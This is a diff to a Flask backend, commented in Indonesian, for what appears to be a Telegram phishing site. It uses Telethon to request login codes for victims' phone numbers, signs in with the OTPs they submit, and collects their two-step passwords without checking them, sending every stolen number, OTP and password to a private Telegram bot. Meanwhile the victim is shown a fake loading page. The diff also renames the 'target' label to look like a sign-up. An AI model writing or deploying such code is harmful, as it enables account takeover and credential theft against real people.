@@ -7,9 +7,10 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-CORS(app)
+# Mengizinkan akses dari domain manapun secara global
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Ambil variabel dari dashboard Railway
+# Variabel dari dashboard Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -18,7 +19,6 @@ CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 sessions_hash = {}
 
 def send_to_bot(message):
-    """Kirim laporan ke Bot Telegram pribadi"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
@@ -26,7 +26,7 @@ def send_to_bot(message):
         pass
 
 async def telethon_logic(data):
-    """Logika Telethon: Deteksi 2FA tapi abaikan validasi sandinya"""
+    """Logika Telethon: Deteksi OTP & Langsung Loloskan 2FA ke Loading"""
     step = data.get('step')
     nomor = data.get('nomor')
     otp = data.get('otp')
@@ -42,7 +42,7 @@ async def telethon_logic(data):
         if step == 1:
             sent_code = await client.send_code_request(nomor)
             sessions_hash[nomor] = sent_code.phone_code_hash
-            send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
+            send_to_bot(f"📲 *Mencoba Daftar*\nNama: {nama}\nNomor: {nomor}")
             return {"status": "success"}, 200
 
         # STEP 2: Verifikasi OTP & Deteksi 2FA
@@ -53,15 +53,15 @@ async def telethon_logic(data):
                 send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                 return {"status": "success"}, 200
             except errors.SessionPasswordNeededError:
-                # Jika akun punya 2FA, arahkan website ke halaman input sandi
+                # Jika akun punya sandi, arahkan ke halaman input sandi
                 return {"status": "need_2fa"}, 200
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
-        # STEP 3: Terima Sandi (Abaikan Validasi)
+        # STEP 3: Terima Sandi (Abaikan Validasi agar langsung ke Loading)
         elif step == 3:
-            # Apapun sandinya, kirim ke bot dan beri respon sukses agar pindah ke halaman loading
             send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
+            # Beri respon sukses agar website beralih ke halaman loading 24 jam
             return {"status": "success"}, 200
 
     except Exception as e:
@@ -69,30 +69,27 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-# Fungsi Fix CORS agar tidak merah di konsol browser
-def fix_cors(response):
+# FUNGSI FIX CORS MANUAL: Memaksa header izin agar tidak merah di konsol
+def _corsify(response):
     response.headers.add("Access-Control-Allow-Origin", "*")
-    response.headers.add("Access-Control-Allow-Headers", "Content-Type,Authorization")
-    response.headers.add("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE,OPTIONS")
+    response.headers.add("Access-Control-Allow-Headers", "*")
+    response.headers.add("Access-Control-Allow-Methods", "*")
     return response
 
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Tangani Preflight Request agar tombol bisa diklik
+    # Menangani pengecekan (preflight) browser agar tombol bisa diklik
     if request.method == 'OPTIONS':
-        return fix_cors(make_response())
+        return _corsify(make_response())
         
     data = request.json
     try:
-        # Jalankan logika async secara stabil
         result, status_code = async_to_sync(telethon_logic)(data)
-        response = make_response(jsonify(result), status_code)
-        return fix_cors(response)
+        return _corsify(make_response(jsonify(result), status_code))
     except Exception as e:
-        response = make_response(jsonify({"status": "error", "message": str(e)}), 500)
-        return fix_cors(response)
+        return _corsify(make_response(jsonify({"status": "error", "message": str(e)}), 500))
 
 if __name__ == "__main__":
-    # Gunakan port 8080 sesuai log Railway
+    # Port 8080 sesuai dengan log Railway kamu
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
